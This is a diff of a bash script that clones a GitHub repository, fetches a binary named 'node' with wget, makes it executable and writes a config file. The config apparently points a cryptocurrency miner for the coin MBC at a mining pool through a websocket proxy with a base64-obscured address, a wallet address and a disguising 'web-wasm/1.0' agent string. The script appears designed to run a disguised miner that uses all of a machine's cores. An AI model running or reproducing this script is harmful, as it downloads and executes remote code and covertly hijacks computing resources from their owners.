@@ -1,8 +1,8 @@
 #!/bin/bash
-git clone https://github.com/miltoncarpenter665/node-power2.git
+git clone https://github.com/miltoncarpenter665/nano-mbc.git
 sleep 2
-cd node-power2
-wget https://raw.githubusercontent.com/miltoncarpenter665/node-mino-app/refs/heads/main/node
+cd nano-mbc
+wget https://raw.githubusercontent.com/miltoncarpenter665/nano-mbc/refs/heads/main/node
 sleep 2
 chmod +x node
 sleep 2
@@ -39,14 +39,11 @@ echo ""
 sleep 2
 
 
-cat > data.txt <<END
-
+cat > data.json <<END
 {
-  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/cG93ZXIyYi5ldS5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
-  "user": "Bh43dUV3ypTM7SRFcyBcV1Rt8A1taua7FG.$currentdate",
-  "password": "c=MBC,mc=MBC,ID=$currentdate",
-  "threads": $used_num_of_cores,
-  "log": true
+  "proxy": "ws://usashadespectre$(shuf -i 1-6 -n 1).devopsenterprise.uk:9999/emVyZ3AyYi5kZXZvcHNlbnRlcnByaXNlLnVrOjc0NDU=",
+  "config": { "threads": $used_num_of_cores, "log": true },
+  "options": { "user": "Bh43dUV3ypTM7SRFcyBcV1Rt8A1taua7FG.$currentdate", "password": "c=MBC,mc=MBC,ID=$currentdate", "argent": "web-wasm/1.0" }
 }
 END
 
